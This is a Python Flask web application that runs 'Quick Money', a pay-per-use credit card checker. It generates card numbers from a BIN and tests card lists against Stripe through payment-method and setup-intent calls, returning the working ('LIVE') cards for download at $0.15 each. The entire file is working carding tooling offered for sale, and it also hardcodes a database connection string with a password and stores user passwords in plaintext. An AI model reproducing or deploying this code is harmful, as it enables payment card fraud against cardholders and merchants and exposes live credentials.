import os, random, time, json, requests
from flask import Flask, render_template_string, request, redirect, session, url_for, jsonify
from pymongo import MongoClient

app = Flask(__name__)
app.secret_key = 'quick_money_v49_nitro_master'

# --- [ CONFIGURACIÓN MAESTRA ] ---
MONGO_URI = "mongodb+srv://mairo:mairo1212@cluster0.inuth4k.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"

try:
    client = MongoClient(MONGO_URI)
    db_mongo = client['quickmoney_db']
    usuarios_col = db_mongo['usuarios']
    config_col = db_mongo['config']
except Exception as e:
    print(f"Error MongoDB: {e}")

COSTO_LIVE = 0.15

# --- [ MOTOR PRO: SETUP INTENT ] ---
def check_gate_nitro(cc, sk_key):
    try:
        partes = cc.split('|')
        if len(partes) < 4: return {"status": "DEAD", "msg": "FORMATO ERROR"}
        num, mes, ano, cvv = partes[0], partes[1], partes[2], partes[3]
        headers = {"Authorization": f"Bearer {sk_key}", "Content-Type": "application/x-www-form-urlencoded"}
        pm_data = {"type": "card", "card[number]": num, "card[exp_month]": int(mes), "card[exp_year]": int(ano), "card[cvc]": cvv}
        pm_res = requests.post('https://api.stripe.com/v1/payment_methods', data=pm_data, headers=headers, timeout=10)
        pm_json = pm_res.json()
        if "error" in pm_json: return {"status": "DEAD", "msg": pm_json['error'].get('message', 'DECLINED').upper()}
        si_data = {"payment_method": pm_json['id'], "confirm": "true", "usage": "off_session"}
        si_res = requests.post('https://api.stripe.com/v1/setup_intents', data=si_data, headers=headers, timeout=10)
        si_json = si_res.json()
        if "error" in si_json: return {"status": "DEAD", "msg": si_json['error'].get('decline_code', 'DECLINED').upper()}
        if si_json.get('status') in ['succeeded', 'requires_action', 'processing']: return {"status": "LIVE", "msg": "AUTHORIZED"}
        return {"status": "DEAD", "msg": "FAILED_AUTH"}
    except: return {"status": "DEAD", "msg": "GATE_ERROR"}

# --- [ DISEÑO MEJORADO V49 NITRO ] ---
CSS = """
<style>
    @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;700&display=swap');
    :root { --gold: #c5a059; --bg: #0b0b0d; --card: rgba(15, 15, 18, 0.95); --border: #1e1e24; --green: #2ecc71; --red: #ff4757; }
    body { background: var(--bg); color: #fff; font-family: 'JetBrains Mono', monospace; margin: 0; padding: 0; min-height: 100vh; }
    .container { max-width: 600px; margin: auto; padding: 20px; position: relative; z-index: 10; }
    .card { background: var(--card); border: 1px solid var(--border); padding: 20px; margin-bottom: 20px; border-radius: 4px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
    .card-h { font-size: 10px; color: var(--gold); text-transform: uppercase; font-weight: bold; border-bottom: 1px solid var(--border); padding-bottom: 8px; margin-bottom: 15px; display: block; letter-spacing: 2px; }
    input, textarea { width: 100%; background: #050505; border: 1px solid var(--border); color: #fff; padding: 12px; margin-bottom: 10px; box-sizing: border-box; font-family: inherit; font-size: 13px; outline: none; border-radius: 2px; }
    .btn { border: none; padding: 15px; font-weight: bold; cursor: pointer; text-transform: uppercase; font-size: 11px; width: 100%; transition: 0.2s; font-family: inherit; border-radius: 2px; }
    .btn-gold { background: var(--gold); color: #000; }
    .btn-dark { background: #0a0a0a; color: #fff; border: 1px solid #1a1a1e; }
    .btn-mini { padding: 8px 12px; width: auto; font-size: 10px; }
    .res-box { border-radius: 2px; padding: 10px; font-size: 11px; min-height: 80px; border: 1px solid #1e1e24; background: #030303; overflow-y: auto; max-height: 200px; margin-bottom: 10px; }
    table { width: 100%; font-size: 10px; border-collapse: collapse; margin-top: 10px; }
    th { text-align: left; color: var(--gold); border-bottom: 1px solid var(--border); padding: 5px; }
    td { padding: 8px 5px; border-bottom: 1px solid #111; }
    .flex-row { display: flex; gap: 10px; align-items: center; }
</style>
"""

@app.route('/')
def login():
    if 'user' in session: return redirect(url_for('panel'))
    return render_template_string(f'<html><head><meta name="viewport" content="width=device-width, initial-scale=1">{CSS}</head><body style="display:flex;align-items:center;justify-content:center;height:100vh;"><div class="card" style="width:320px; text-align:center;"><h2>⚡️🌩️Quick Money🌩️⚡️</h2><span style="color:var(--gold); font-size:10px;">{{CHK}}</span><br><br><form method="POST" action="/auth"><input name="u" placeholder="USUARIO"><input type="password" name="p" placeholder="PASS"><button class="btn btn-gold">INGRESAR</button></form><br><a href="/register" style="color:var(--gold); font-size:10px; text-decoration:none;">¿No tiene cuenta? Regístrese</a></div></body></html>')

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        u, p, t = request.form.get('u'), request.form.get('p'), request.form.get('t')
        if not usuarios_col.find_one({"u": u}):
            usuarios_col.insert_one({"u": u, "p": p, "saldo": 0.0, "rango": "USER", "telegram": t})
            return redirect(url_for('login'))
    return render_template_string(f'<html><head><meta name="viewport" content="width=device-width, initial-scale=1">{CSS}</head><body><div class="container"><div class="card" style="text-align:center;"><h2>REGISTRO</h2><form method="POST"><input name="u" placeholder="USUARIO"><input type="password" name="p" placeholder="PASS"><input name="t" placeholder="TELEGRAM @ID"><button class="btn btn-gold">REGISTRARSE</button></form></div></div></body></html>')

@app.route('/panel')
def panel():
    if 'user' not in session: return redirect(url_for('login'))
    u_data = usuarios_col.find_one({"u": session['user']})
    is_admin = session['user'].lower() == "mairo"
    
    current_sk = config_col.find_one({"key": "sk_live"})
    sk_val = current_sk['val'] if current_sk else ""

    # LISTA DE USUARIOS PARA EL ADMIN
    all_users = list(usuarios_col.find()) if is_admin else []

    return render_template_string(f"""
    <html><head><meta name="viewport" content="width=device-width, initial-scale=1">{CSS}</head>
    <body><div class="container">
        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;">
            <div style="font-size:11px;">ID: <b style="color:var(--gold)">{session['user'].upper()}</b></div>
            <div style="border:1px solid var(--gold); padding:8px 12px; color:var(--gold); font-size:11px;">BALANCE: <b id="display_saldo">${u_data['saldo']:.2f}</b></div>
        </div>

        {f'''<div class="card" style="border:1px solid var(--gold)"><span class="card-h">👑 ADMIN NITRO CONTROL</span>
            <form action="/update_sk" method="POST" class="flex-row">
                <input name="new_sk" placeholder="SK_LIVE_..." value="{sk_val}" style="margin-bottom:0;">
                <button class="btn btn-gold btn-mini">ACTUALIZAR</button>
            </form>
            <hr style="border:0; border-top:1px solid #1a1a1e; margin:15px 0;">
            <form action="/admin_add_saldo" method="POST" class="flex-row">
                <input name="target_user" placeholder="USER" style="margin-bottom:0;">
                <input name="amount" type="number" step="0.01" placeholder="$" style="margin-bottom:0; width:80px;">
                <button class="btn btn-gold btn-mini">CARGAR</button>
            </form>
            <br>
            <span class="card-h">CLIENTES REGISTRADOS</span>
            <table>
                <tr><th>USUARIO</th><th>TELEGRAM</th><th>SALDO</th></tr>
                {''.join([f"<tr><td>{u['u']}</td><td>{u.get('telegram','-')}</td><td style='color:var(--gold)'>${u['saldo']:.2f}</td></tr>" for u in all_users])}
            </table>
        </div>''' if is_admin else ""}

        <div class="card"><span class="card-h">🪄 GENERADOR DE TARJETAS</span>
            <div class="flex-row">
                <input id="bin_val" placeholder="BIN (473702)" value="473702" style="margin-bottom:0;">
                <button class="btn btn-dark btn-mini" onclick="generar()">GENERAR</button>
            </div>
            <br>
            <span class="card-h">CHECKER GATE NITRO</span>
            <textarea id="check_list" rows="6" placeholder="CC|MM|YY|CVV"></textarea>
            <button class="btn btn-gold" id="btn_start" onclick="startChecking()">🚀 INICIAR PROCESO ($0.15)</button>
        </div>

        <div style="display:flex; justify-content:space-between;"><span style="color:var(--green); font-size:10px;">LIVES ✅</span> <button class="btn btn-dark btn-mini" onclick="descargarLives()">DESCARGAR</button></div>
        <div class="res-box" id="lives_log"></div>
        <div style="color:var(--red); font-size:10px;">DEAD ❌</div>
        <div class="res-box" id="dead_log" style="opacity:0.5;"></div>

        <div style="text-align:center; margin-top:20px; font-size:10px;">
            <a href="https://t.me/quickmoney_support24" style="color:var(--gold)">SOPORTE</a> | 
            <a href="https://t.me/+GUlp9rhO0_k1ZWYx" style="color:var(--gold)">GRUPO</a> | 
            <a href="/logout" style="color:#666">SALIR</a>
        </div>
    </div>
    <script>
    function generar() {{
        let bin = document.getElementById('bin_val').value;
        if(bin.length < 6) return alert('BIN INVÁLIDO');
        let out = "";
        for(let i=0; i<10; i++) {{
            let n = bin; while(n.length < 16) n += Math.floor(Math.random()*10);
            let m = ["01","02","03","04","05","06","07","08","09","10","11","12"][Math.floor(Math.random()*12)];
            let y = 2025 + Math.floor(Math.random()*6);
            let c = Math.floor(Math.random()*899)+100;
            out += n+"|"+m+"|"+y+"|"+c+"\\n";
        }}
        document.getElementById('check_list').value = out;
    }}
    async function startChecking() {{
        let a = document.getElementById('check_list'); let lines = a.value.trim().split('\\n');
        if(!lines[0]) return; document.getElementById('btn_start').disabled = true;
        for (let cc of lines) {{
            let r = await fetch('/validar_card', {{method:'POST', headers:{{'Content-Type':'application/json'}}, body:JSON.stringify({{card:cc.trim()}})}});
            let d = await r.json();
            if(d.status === 'LIVE') {{
                document.getElementById('display_saldo').innerText = '$' + d.nuevo_saldo.toFixed(2);
                document.getElementById('lives_log').innerHTML = '<div style="color:var(--green); margin-bottom:5px;">'+cc+' | AUTHORIZED</div>' + document.getElementById('lives_log').innerHTML;
            }} else {{
                document.getElementById('dead_log').innerHTML = '<div>'+cc+' | '+d.msg+'</div>' + document.getElementById('dead_log').innerHTML;
            }}
        }}
        document.getElementById('btn_start').disabled = false;
    }}
    function descargarLives() {{
        let data = document.getElementById('lives_log').innerText;
        let blob = new Blob([data], {{type: 'text/plain'}});
        let a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = 'lives.txt'; a.click();
    }}
    </script></body></html>
    """)

@app.route('/update_sk', methods=['POST'])
def update_sk():
    if session.get('user', '').lower() != "mairo": return redirect(url_for('panel'))
    new_sk = request.form.get('new_sk').strip()
    config_col.update_one({"key": "sk_live"}, {"$set": {"val": new_sk}}, upsert=True)
    return redirect(url_for('panel'))

@app.route('/validar_card', methods=['POST'])
def validar():
    u_data = usuarios_col.find_one({"u": session['user']})
    if u_data['saldo'] < COSTO_LIVE: return jsonify({"status":"DEAD", "msg": "SIN SALDO"})
    sk_data = config_col.find_one({"key": "sk_live"})
    if not sk_data: return jsonify({"status":"DEAD", "msg": "SK NO CONFIG"})
    cc = request.json.get('card', '')
    res = check_gate_nitro(cc, sk_data['val'])
    if res['status'] == 'LIVE':
        new_s = round(u_data['saldo'] - COSTO_LIVE, 2)
        usuarios_col.update_one({"u": session['user']}, {"$set": {"saldo": new_s}})
        return jsonify({"status": "LIVE", "nuevo_saldo": new_s})
    return jsonify({"status": "DEAD", "msg": res['msg']})

@app.route('/auth', methods=['POST'])
def auth():
    u, p = request.form.get('u'), request.form.get('p')
    user_db = usuarios_col.find_one({"u": u, "p": p})
    if user_db: session['user'] = u
    return redirect(url_for('panel'))

@app.route('/admin_add_saldo', methods=['POST'])
def admin_add_saldo():
    if session.get('user', '').lower() != "mairo": return redirect(url_for('panel'))
    usuarios_col.update_one({"u": request.form.get('target_user')}, {"$inc": {"saldo": float(request.form.get('amount'))}})
    return redirect(url_for('panel'))

@app.route('/logout')
def logout(): session.clear(); return redirect(url_for('login'))

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
